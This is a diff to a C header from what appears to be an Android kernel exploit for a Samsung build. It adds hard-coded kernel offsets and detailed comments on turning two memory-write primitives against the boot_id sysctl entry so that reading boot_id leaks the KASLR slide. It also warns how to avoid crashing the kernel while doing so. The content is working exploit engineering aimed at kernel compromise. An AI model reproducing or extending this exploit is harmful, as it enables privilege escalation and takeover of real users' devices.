@@ -127,11 +127,35 @@
  * &nfulnl_logger. All three values below are cross-validated against the
  * boot.img vmlinux (see tools/derive_slide_gadgets.py):
  *   loggers == nfulnl_logger - 0xd8 (nf_log.c layout, same as oplus K40)
- *   random_table[4].procname -> "boot_id"; .data addend == kallsyms sysctl_bootid
+ *   random_table entry[8] procname == "boot_id" (table links at
+ *   0xffffff800accd890; slot = entry[8].data); .data addend == kallsyms
+ *   sysctl_bootid — re-verified by hand 2026-11-05: nm random_table +
+ *   .rela.dyn at off 0xffffff800accd998 -> addend 0xffffff800b2eacec
  */
 #define SLIDE_NFULNL_LOGGER_OFF 0x02ba5ea0ULL           /* [A] */
 #define SLIDE_LOGGERS_0_1_OFF 0x02ba5dc8ULL              /* [A] &loggers[0][0] */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02c4d998ULL      /* [A] random_table[4].data slot */
+/* [A] the qword pair just below random_table's boot_id .data slot.
+ * NOTE: this build's struct ctl_table has a 0x40 stride (Samsung extra
+ * fields), so the boot_id entry — nm/RELA verified, and matching the
+ * original random_table[4] comment — sits at table+0x100 = link
+ * 0xffffff800accd990 (procname -> the "boot_id" .rodata string at link
+ * 0xffffff800a209a37; .data slot at +8 = 0xffffff800accd998, RELA
+ * addend 0xffffff800b2eacec = the .bss uuid buffer). W1 aims the
+ * boot_id .data slot at this pair: q0 = the previous entry's tail
+ * field (content unknown, reported as noise), q1 = the boot_id
+ * procname pointer = link 0xffffff800a209a37 + slide — the readback
+ * leaks the slide directly (slide = q1 - 0xa209a37 link base). W2's
+ * *(P+8)=C lands on the procname slot (dead after sysctl
+ * registration), P+8 is writable .data, and byte 8 (the string
+ * pointer's LSB, 0x37) is nonzero so proc_do_uuid serves the pair
+ * instead of regenerating. Do NOT aim P at the boot_id entry's
+ * proc_handler slot: W2 would overwrite it and the next sysctl read
+ * would call a data address as a function. */
+#define SLIDE_READ_PAIR_OFF 0x02c4d988ULL
+/* [A] the "boot_id" procname .rodata string (RELA target of slot
+ * 0xffffff800accd990) — the q1 leak anchor. */
+#define SLIDE_BOOTID_STRING_OFF 0x02189a37ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02c4d998ULL      /* [A] random_table entry[8] ("boot_id") .data slot */
 #define SLIDE_SYSCTL_BOOTID_OFF 0x0326acecULL            /* [A] sysctl_bootid buffer (.bss) */
 #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
@@ -139,6 +163,8 @@
 
 #define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
 #define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
+#define SLIDE_READ_PAIR_IMAGE (KIMAGE_TEXT_BASE + SLIDE_READ_PAIR_OFF)
+#define SLIDE_BOOTID_STRING_IMAGE (KIMAGE_TEXT_BASE + SLIDE_BOOTID_STRING_OFF)
 #define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
 #define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
 #define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
